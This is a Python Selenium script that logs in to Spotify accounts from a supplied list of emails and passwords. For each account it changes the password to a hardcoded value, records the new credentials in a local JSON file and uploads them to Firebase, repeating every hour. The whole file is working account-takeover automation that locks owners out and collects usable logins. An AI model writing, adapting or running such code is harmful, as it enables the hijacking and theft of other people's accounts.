import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from firebase_db import store_data
import json


def install_driver():
    op = webdriver.ChromeOptions()
    op.add_argument('headless')
    op.add_experimental_option('detach', True)
    path = ChromeDriverManager().install()
    driver = webdriver.Chrome(path, chrome_options=op)
    return driver


def change_passwords(email, password):
    url = 'https://accounts.spotify.com/en/login'
    driver = install_driver()
    driver.get(url)
    try:
        email_input = driver.find_element(By.XPATH, '//*[@id="login-username"]')
        email_input.send_keys(email)
        time.sleep(1)
        password_input = driver.find_element(By.XPATH, '//*[@id="login-password"]')
        password_input.send_keys(password)
        driver.find_element(By.XPATH, '//*[@id="login-button"]').click()
        time.sleep(5)
        print('Login successfully')
        driver.find_element(By.XPATH, '//*[@id="account-settings-link"]/div[1]/p').click()
        time.sleep(3)
        change_password_url = 'https://www.spotify.com/am/account/change-password/'
        driver.get(change_password_url)
        time.sleep(3)
        current_password = driver.find_element(By.XPATH, '//*[@id="old_password"]')
        current_password.send_keys(password)
        time.sleep(1)
        new_passwords = '077108803Gb'
        new_password = driver.find_element(By.XPATH, '//*[@id="new_password"]')
        new_password.send_keys(new_passwords)
        time.sleep(1)
        repeat_new_password = driver.find_element(By.XPATH, '//*[@id="new_password_confirmation"]')
        repeat_new_password.send_keys(new_passwords)
        time.sleep(1)
        driver.find_element(By.XPATH,
                            '//*[@id="__next"]/div/div/div[2]/div[2]/div[2]/div/article/section/form/div[4]/button') \
            .click()
        print(f'Change successfully. New password is {new_passwords} for user {email} ')
        data = {
            'email': email,
            'password': new_passwords

        }
        with open('./users/client_credentials_final.json', 'r+') as savefile:
            file_data = json.load(savefile)
            file_data['users'].append(data)
            savefile.seek(0)
            json.dump(file_data, savefile, indent=7)
        driver.close()
    except Exception as e:
        print(f'Failed to change password! Error message is: {e}')


def run():
    while True:
        file = open(r'./users/users.json')
        data = json.load(file)
        num = 0
        for items in data['users']:
            change_passwords(items['email'], items['password'])
            time.sleep(1)
            num += 1
            print(f'{num} account with changes password')
        try:
            print('Storing in Firebase.....')
            store_data()
            print('Sored successfully')
        except Exception as e:
            print(f'Failed to store data {e}')
        time.sleep(3600)


if __name__ == '__main__':
    run()
